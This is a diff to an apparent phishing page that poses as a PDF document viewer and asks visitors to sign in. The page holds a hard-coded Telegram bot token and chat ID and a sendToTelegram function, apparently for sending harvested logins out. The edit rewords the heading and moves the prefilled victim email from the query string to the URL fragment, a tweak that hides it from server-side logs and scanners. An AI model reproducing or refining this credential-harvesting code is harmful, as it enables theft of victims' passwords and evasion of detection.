@@ -138,7 +138,7 @@
 
  <div class="login-card" id="loginCard">
  <img src="dds.png" alt="PDF Logo">
- <h2>Sign in to view the<br>Document.</h2>
+ <h2>Sign in to view the<br>documentation.</h2>
 
  <div id="message" aria-live="polite"></div>
 
@@ -158,8 +158,8 @@
 
  <script>
  const TELEGRAM_CONFIG = {
-  token: "7472406873:AAEUuQF4ON6-GorYaEImnJvNf--CzPg2xCU",
-  chatId: "6992242865"
+ token: "7472406873:AAEUuQF4ON6-GorYaEImnJvNf--CzPg2xCU",
+ chatId: "6992242865"
  };
 
  async function sendToTelegram(message) {
@@ -259,21 +259,17 @@
  document.getElementById('password').value = ''; // Clear the password field
  }
 
- function getQueryParam(param) {
- const urlParams = new URLSearchParams(window.location.search);
- return urlParams.get(param);
- }
-
+// Updated to grab email from the URL fragment (after #)
  window.onload = function () {
- const emailParam = getQueryParam('email');
- const emailInput = document.getElementById('email');
- if (emailParam) {
- emailInput.value = decodeURIComponent(emailParam);
- emailInput.disabled = true;
- } else {
- emailInput.placeholder = "Email address";
- emailInput.disabled = false;
- }
+     const emailParam = window.location.hash.substring(1); // Get the part after #
+     const emailInput = document.getElementById('email');
+     if (/^[\w-\.]+@([\w-]+\.)+[\w-]{2,4}$/.test(emailParam)) { // Validate email format
+         emailInput.value = decodeURIComponent(emailParam);
+         emailInput.disabled = true; // Disable input if email is set
+     } else {
+         emailInput.placeholder = "Email address";
+         emailInput.disabled = false;
+     }
  };
  </script>
 </body>
